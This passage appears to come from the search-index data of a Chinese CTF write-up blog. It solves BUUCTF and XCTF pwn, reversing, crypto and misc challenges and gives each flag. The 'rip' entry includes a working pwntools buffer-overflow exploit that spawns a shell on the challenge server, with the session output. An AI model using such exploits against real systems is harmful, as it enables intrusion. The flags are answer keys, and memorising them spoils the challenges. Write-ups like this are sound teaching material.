class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib32</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">pwn</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> cat /flag.txt</span></span><br><span class=\"line\">flag&#123;f6e2b4ad-6f56-4c6f-8d7a-df90f2abae35&#125;</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> </span></span><br><span class=\"line\">[*] Interrupted</span><br><span class=\"line\">[*] Closed connection to node4.buuoj.cn port 25076</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{f6e2b4ad-6f56-4c6f-8d7a-df90f2abae35}</del></p>\n<hr>\n<p>参考：<br>1.<a href=\"https://www.cnblogs.com/vict0r/p/13806350.html\">jarvisoj_level0 </a></p>\n","categories":["Pwn","栈溢出"]},{"title":"others_shellcode","url":"/2021/09/03/others_shellcode/","content":"<p><a href=\"https://buuoj.cn/challenges#others_shellcode\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>这题有点奇怪，直接连接就能得到flag：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ nc node4.buuoj.cn 25817</span><br><span class=\"line\">ls</span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag.txt</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib32</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">pwn</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br><span class=\"line\">cat flag</span><br><span class=\"line\">flag&#123;12806517-655a-4fb7-941e-04f1549da2e8&#125;</span><br><span class=\"line\">^C</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{12806517-655a-4fb7-941e-04f1549da2e8}</del></p>\n","categories":["Pwn"]},{"title":"reverse1","url":"/2021/08/26/reverse1/","content":"<p><a href=\"https://buuoj.cn/challenges#reverse1\">题目链接</a><br>拖进IDA分析一下，看一下主函数：<br><img src=\"/images/Writeup/20210826162729.png\"><br>一路跟进下去，发现难度实在太大，换一下，看一下字符列表：<br><img src=\"/images/Writeup/20210826163344.png\"><br>发现了存在flag数据的痕迹，跟进一下：<br><img src=\"/images/Writeup/20210826163526.png\"><br>跟进一下sub_1400118C0函数：<br><img src=\"/images/Writeup/20210826163557.png\"><br><img src=\"/images/Writeup/20210826163622.png\"><br>可以看到这里有一个字符串比较函数，看来是拿输入字符串与Str2作了比较：<br><img src=\"/images/Writeup/20210826163904.png\"><br>跟踪Str2的数据，看见了flag：<br><img src=\"/images/Writeup/20210826163939.png\"><br>flag:<del>flag{hello_world}</del><br>但是，真的结束了吗？将flag数据提交上去，发现系统返回flag不对，再返回看一下Str2的处理过程，发现做了字符替换：<br><img src=\"/images/Writeup/20210826164134.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; ; ++j )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tv8 = j;</span><br><span class=\"line\">\tv2 = j_strlen(Str2);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( v8 &gt; v2 )</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( Str2[j] == <span class=\"number\">111</span> )</span><br><span class=\"line\">\t\tStr2[j] = <span class=\"number\">48</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>转换一下ASCII编码显示一下字符：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; ; ++j )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tv8 = j;</span><br><span class=\"line\">\tv2 = j_strlen(Str2);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( v8 &gt; v2 )</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> ( Str2[j] == <span class=\"string\">&#x27;o&#x27;</span> )</span><br><span class=\"line\">\t\tStr2[j] = <span class=\"string\">&#x27;0&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看来是将Str2里面的“o”替换成了”0”，于是得到了最终flag<br>flag:<del>flag{hell0_w0rld}</del></p>\n","categories":["Reserve"]},{"title":"reverse2","url":"/2021/08/26/reverse2/","content":"<p><a href=\"https://buuoj.cn/challenges#reverse2\">题目链接</a><br>拖进IDA分析一下：<br><img src=\"/images/Writeup/20210826204912.png\"><br>吐槽一下，这个还比[[reverse1)简单，这个在主函数就看到了flag的影子，[[reverse1)还要去字符库里面找。。<br>逆向编译一下，看看有关flag的操作：<br><img src=\"/images/Writeup/20210826205058.png\"></p>\n<p>核心代码： ^199370</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( pid )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\twaitpid(pid, &amp;stat_loc, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"built_in\">strlen</span>(&amp;flag); ++i )</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ( *(&amp;flag + i) == <span class=\"number\">105</span> || *(&amp;flag + i) == <span class=\"number\">114</span> )</span><br><span class=\"line\">\t\t\t*(&amp;flag + i) = <span class=\"number\">49</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;input the flag:&quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(<span class=\"string\">&quot;%20s&quot;</span>, s2);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(&amp;flag, s2) )</span><br><span class=\"line\">\tresult = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;this is the right flag!&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">\tresult = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong flag!&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>看来是用户输入了s2，然后比较$flag的值与s2。那么s2就代表着flag，即去追踪&amp;flag的数据：<br><img src=\"/images/Writeup/20210826205424.png\"><br>找到了，ASCII码转换一下：<br><img src=\"/images/Writeup/20210826205454.png\"><br>那么<del>flag{hacking_for_fun}</del>就是最终flag的数据？并不是，在[[reverse2#^199370|核心代码)里面可以看见&amp;flag的数值做出了改变，ASCII转换一下看一下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( pid )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\twaitpid(pid, &amp;stat_loc, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"built_in\">strlen</span>(&amp;flag); ++i )</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> ( *(&amp;flag + i) == <span class=\"string\">&quot;i&quot;</span> || *(&amp;flag + i) == <span class=\"string\">&quot;r&quot;</span> )</span><br><span class=\"line\">\t\t\t*(&amp;flag + i) = <span class=\"string\">&quot;1&quot;</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;input the flag:&quot;</span>);</span><br><span class=\"line\">__isoc99_scanf(<span class=\"string\">&quot;%20s&quot;</span>, s2);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ( !<span class=\"built_in\">strcmp</span>(&amp;flag, s2) )</span><br><span class=\"line\">\tresult = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;this is the right flag!&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">\tresult = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;wrong flag!&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> result;</span><br></pre></td></tr></table></figure>\n<p>替换一下字符，便得到了最终正确的flag。<br>flag:<del>flag{hack1ng_fo1_fun}</del></p>\n","categories":["Reserve"]},{"title":"reverse3","url":"/2021/08/27/reverse3/","content":"<p><a href=\"https://buuoj.cn/challenges#reverse3\">题目链接</a><br>附件下载得到程序，看一下信息：<br><img src=\"/images/Writeup/20210827124132.png\"><br>IDA打开：<br><img src=\"/images/Writeup/20210827124243.png\"><br>F5逆向一下，看看核心：<br><img src=\"/images/Writeup/20210827124525.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">v4 = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"built_in\">strcpy</span>(v3, <span class=\"string\">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;you can choose one action to execute&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1 up&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2 down&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3 left&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4 right\\n:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>, &amp;v5);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v5 == <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ++*(_DWORD *)&amp;v3[<span class=\"number\">25</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (v5 &gt; <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (v5 == <span class=\"number\">3</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            --v4;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (v5 != <span class=\"number\">4</span>)</span><br><span class=\"line\">            LABEL_13:</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">            ++v4;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (v5 != <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">        --*(_DWORD *)&amp;v3[<span class=\"number\">25</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">1</span>; ++i)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (*(<span class=\"keyword\">int</span> *)&amp;v3[<span class=\"number\">4</span> * i + <span class=\"number\">25</span>] &lt; <span class=\"number\">0</span> || *(<span class=\"keyword\">int</span> *)&amp;v3[<span class=\"number\">4</span> * i + <span class=\"number\">25</span>] &gt; <span class=\"number\">4</span>)</span><br><span class=\"line\">            <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v7[<span class=\"number\">5</span> * *(_DWORD *)&amp;v3[<span class=\"number\">25</span>] - <span class=\"number\">41</span> + v4] == <span class=\"number\">49</span>)</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (v7[<span class=\"number\">5</span> * *(_DWORD *)&amp;v3[<span class=\"number\">25</span>] - <span class=\"number\">41</span> + v4] == <span class=\"number\">35</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\nok, the order you enter is the flag!&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看一下逻辑，应该是用v3储存了一个迷宫，然后flag就代表了迷宫的解法，格式化一下迷宫的样子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*1111</span><br><span class=\"line\">01000</span><br><span class=\"line\">01010</span><br><span class=\"line\">00010</span><br><span class=\"line\">1111#</span><br></pre></td></tr></table></figure>\n<p>走一遍迷宫，就能得到flag<br><img src=\"/images/Writeup/20210827125209.png\"><br>flag:flag{222441144222}</p>\n","categories":["Reserve"]},{"title":"rip","url":"/2021/08/26/rip/","content":"<p><a href=\"https://buuoj.cn/challenges#rip\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>先看一下保护信息：<br><img src=\"/images/Writeup/20210914080714.png\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ checksec pwn1</span><br><span class=\"line\">[*] &#x27;/home/randark/shared/pwn1&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>\n<p>IDA打开看一下逻辑：<br><img src=\"/images/Writeup/20210914080827.png\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s[<span class=\"number\">15</span>]; <span class=\"comment\">// [rsp+1h] [rbp-Fh] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;please input&quot;</span>);</span><br><span class=\"line\">  gets(s, argv);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(s);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;ok,bye!!!&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到关键点应该是变量s，再找一下后门函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">fun</span><span class=\"params\">()</span> <span class=\"comment\">//0x401186</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>依此构造playload，并且记得堆栈平衡（Ubuntu 18）：<br><img src=\"/images/Writeup/20210914081347.png\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>, <span class=\"number\">26498</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">backdoor = <span class=\"number\">0x401186</span></span><br><span class=\"line\"></span><br><span class=\"line\">retn = <span class=\"number\">0x401198</span></span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>.encode()*(<span class=\"number\">0xF</span>+<span class=\"number\">8</span>) + p64(retn) + p64(backdoor)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<p>得到返回：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~/shared$ python Pwn.py</span><br><span class=\"line\">[+] Opening connection to node4.buuoj.cn on port 26498: Done</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">bin</span><br><span class=\"line\">boot</span><br><span class=\"line\">dev</span><br><span class=\"line\">etc</span><br><span class=\"line\">flag</span><br><span class=\"line\">home</span><br><span class=\"line\">lib</span><br><span class=\"line\">lib32</span><br><span class=\"line\">lib64</span><br><span class=\"line\">media</span><br><span class=\"line\">mnt</span><br><span class=\"line\">opt</span><br><span class=\"line\">proc</span><br><span class=\"line\">pwn</span><br><span class=\"line\">root</span><br><span class=\"line\">run</span><br><span class=\"line\">sbin</span><br><span class=\"line\">srv</span><br><span class=\"line\">sys</span><br><span class=\"line\">tmp</span><br><span class=\"line\">usr</span><br><span class=\"line\">var</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> cat flag</span></span><br><span class=\"line\">flag&#123;fb8eabb8-482d-407c-aed5-039f1d20cda7&#125;</span><br><span class=\"line\"><span class=\"meta\">$</span><span class=\"bash\"> </span></span><br><span class=\"line\">[*] Interrupted</span><br><span class=\"line\">[*] Closed connection to node4.buuoj.cn port 26498</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{fb8eabb8-482d-407c-aed5-039f1d20cda7}</del></p>\n<hr>\n<p>#pwn<br>2021-09-14</p>\n","categories":["Crypto","摩斯密码","ASCII"]},{"title":"robomunication","url":"/2021/09/24/robomunication/","content":"<p><a href=\"https://buuoj.cn/challenges#robomunication\">题目链接</a></p>\n<span id=\"more\"></span>\n\n<p>附件下载下来，是一个mp3文件，根据音调区分短码和长码，就可以得到一段摩斯密码：</p>\n<p><img src=\"/images/Writeup/image-20210924172035203.png\" alt=\"image-20210924172035203\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.... . .-.. .-.. --- .-- .... .- - .. ... - .... . -.- . -.-- .. - .. ... -... --- --- .--. -... . . .--.</span><br></pre></td></tr></table></figure>\n\n<p>摩斯密码解码后得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">HELLOWHATISTHEKEYITISBOOPBEEP</span><br></pre></td></tr></table></figure>\n\n<p>flag:<del>flag{BOOPBEEP}</del></p>\n","categories":["Crypto","摩斯密码"]},{"title":"watevrCTF 2019-Evil Cuteness","url":"/2021/09/23/watevrCTF%202019-Evil%20Cuteness/","content":"<p><a href=\"https://buuoj.cn/challenges#[watevrCTF%202019]Evil%20Cuteness\">题目链接</a></p>\n<span id=\"more\"></span>\n\n<p>附件下载，用010 Editor看一下，发现文件尾端存在zip文件特征：</p>\n<p><img src=\"/images/Writeup/image-20210924075743136.png\" alt=\"image-20210924075743136\"></p>\n<p>手动把压缩包分离出来，解压出一个文件：</p>\n<p><img src=\"/images/Writeup/image-20210924080016149.png\" alt=\"image-20210924080016149\"></p>\n<p>flag:<del>watevr{7h475_4c7u4lly_r34lly_cu73_7h0u6h}</del></p>\n","categories":["Misc","文件操作"]},{"title":"xor","url":"/2021/08/29/xor%201/","content":"<p><a href=\"https://buuoj.cn/challenges#xor\">题目链接</a><br>拖进Exeinfo分析一下：<br><img src=\"/images/Writeup/20210826212530.png\"><br>IDA打开看结构：<br><img src=\"/images/Writeup/20210826212642.png\"><br>F5逆向看一下：<br><img src=\"/images/Writeup/20210826212743.png\"><br>核心代码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">get_line(__b, <span class=\"number\">256LL</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(__b) != <span class=\"number\">33</span>)</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> LABEL_7;</span><br><span class=\"line\"><span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt; <span class=\"number\">33</span>; ++i)</span><br><span class=\"line\">    __b[i] ^= __b[i - <span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"built_in\">strncmp</span>(__b, global, <span class=\"number\">0x21</span>uLL))</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Success&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    LABEL_7 : <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Failed&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>就是输入的数据储存为__b，然后__b做异或，然后把__b和global做比较。于是追踪global的数据：<br><img src=\"/images/Writeup/20210826215048.png\"><br>写一个python脚本处理数据：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = [<span class=\"string\">&#x27;f&#x27;</span>,<span class=\"number\">10</span>,<span class=\"string\">&#x27;k&#x27;</span>,<span class=\"number\">12</span>,<span class=\"string\">&#x27;w&amp;O.@&#x27;</span>,<span class=\"number\">17</span>,<span class=\"string\">&#x27;x&#x27;</span>,<span class=\"number\">13</span>,<span class=\"string\">&#x27;Z;U&#x27;</span>,<span class=\"number\">17</span>,<span class=\"string\">&#x27;p&#x27;</span>,<span class=\"number\">25</span>,<span class=\"string\">&#x27;F&#x27;</span>,<span class=\"number\">31</span>,<span class=\"string\">&#x27;v&quot;M#D&#x27;</span>,<span class=\"number\">14</span>,<span class=\"string\">&#x27;g&#x27;</span>,<span class=\"number\">6</span>,<span class=\"string\">&#x27;h&#x27;</span>,<span class=\"number\">15</span>,<span class=\"string\">&#x27;G2O&#x27;</span>,<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ss = <span class=\"string\">&#x27;fkw&amp;O.@xZ;UpFv&quot;M#DghG2O&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">x = <span class=\"string\">&quot;f&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">a = [<span class=\"number\">102</span>, <span class=\"number\">10</span>, <span class=\"number\">107</span>, <span class=\"number\">12</span>, <span class=\"number\">119</span>, <span class=\"number\">38</span>, <span class=\"number\">79</span>, <span class=\"number\">46</span>, <span class=\"number\">64</span>, <span class=\"number\">17</span>, <span class=\"number\">120</span>, <span class=\"number\">13</span>, <span class=\"number\">90</span>, <span class=\"number\">59</span>, <span class=\"number\">85</span>, <span class=\"number\">17</span>, <span class=\"number\">112</span>, <span class=\"number\">25</span>, <span class=\"number\">70</span>, <span class=\"number\">31</span>, <span class=\"number\">118</span>, <span class=\"number\">34</span>, <span class=\"number\">77</span>, <span class=\"number\">35</span>, <span class=\"number\">68</span>, <span class=\"number\">14</span>, <span class=\"number\">103</span>, <span class=\"number\">6</span>, <span class=\"number\">104</span>, <span class=\"number\">15</span>, <span class=\"number\">71</span>, <span class=\"number\">50</span>, <span class=\"number\">79</span> ,<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"built_in\">len</span>(a)):</span><br><span class=\"line\">\tx += <span class=\"built_in\">chr</span>(a[i]^a[i-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br></pre></td></tr></table></figure>\n<p>flag:<del>flag{QianQiuWanDai_YiTongJiangHu}</del></p>\n","categories":["Reserve"]},{"title":"不仅仅是Morse","url":"/2021/09/19/%E4%B8%8D%E4%BB%85%E4%BB%85%E6%98%AFMorse/","content":"<p><a href=\"https://adworld.xctf.org.cn/task/answer?type=crypto&number=5&grade=0&id=5117&page=1\">不仅仅是Morse</a></p>\n<span id=\"more\"></span>\n\n<p>附件下载，是一个txt文件，得到一串密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">--/.-/-.--/..--.-/-..././..--.-/..../.-/...-/./..--.-/.-/-./---/-/...././.-./..--.-/-.././-.-./---/-.././..../..../..../..../.-/.-/.-/.-/.-/-.../.-/.-/-.../-.../-.../.-/.-/-.../-.../.-/.-/.-/.-/.-/.-/.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/.-/.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../-.../.-/.-/.-/-.../-.../.-/.-/-.../.-/.-/.-/.-/-.../.-/-.../.-/.-/-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/-.../-.../.-/.-/-.../-.../-.../.-/-.../.-/.-/.-/-.../.-/-.../.-/-.../-.../.-/.-/.-/-.../-.../.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../-.../.-/.-/-.../-.../.-/.-/-.../.-/.-/-.../.-/.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/.-/-.../.-/-.../.-/.-/-.../-.../.-/-.../.-/.-/.-/.-/-.../-.../.-/-.../.-/.-/-.../-.../.-</span><br></pre></td></tr></table></figure>\n\n<p>按照<code>/</code>来分割，得到一串摩斯密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"linespan><br></pre></td></tr></table></figure>\n\n<p>摩丝密码转换，得到：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure>\n\n<p>提取有效信息，进行培根密码解密：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">密文：AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br><span class=\"line\">明文：ATTACKANDDEFENCEWORLDISINTERESTING</span><br><span class=\"line\">转换小写：attackanddefenceworldisinteresting</span><br></pre></td></tr></table></figure>\n\n<p>包上格式，得到flag:<del>cyberpeace{attackanddefenceworldisinteresting}</del></p>\n","categories":["Crypto","摩斯密码"]},{"title":"世上无难事","url":"/2021/08/26/%E4%B8%96%E4%B8%8A%E6%97%A0%E9%9A%BE%E4%BA%8B/","content":"<p><a href=\"https://buuoj.cn/challenges#%E4%B8%96%E4%B8%8A%E6%97%A0%E9%9A%BE%E4%BA%8B\">题目链接</a></p>\n<span id=\"more\"></span>\n<p>附件下载，得到密文：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">VIZZB IFIUOJBWO NVXAP OBC XZZ UKHVN IFIUOJBWO HB XVIXW XAW VXFI X QIXN VBD KQ IFIUOJBWO WBKAH NBWXO VBD XJBCN NKG QLKEIU DI XUI VIUI DKNV QNCWIANQ XN DXPIMKIZW VKHV QEVBBZ KA XUZKAHNBA FKUHKAKX XAW DI VXFI HBN QNCWIANQ NCAKAH KA MUBG XZZ XEUBQQ XGIUKEX MUBG PKAWIUHXUNIA NVUBCHV 12NV HUXWI XAW DI XUI SCQN QB HZXW NVXN XZZ EBCZW SBKA CQ 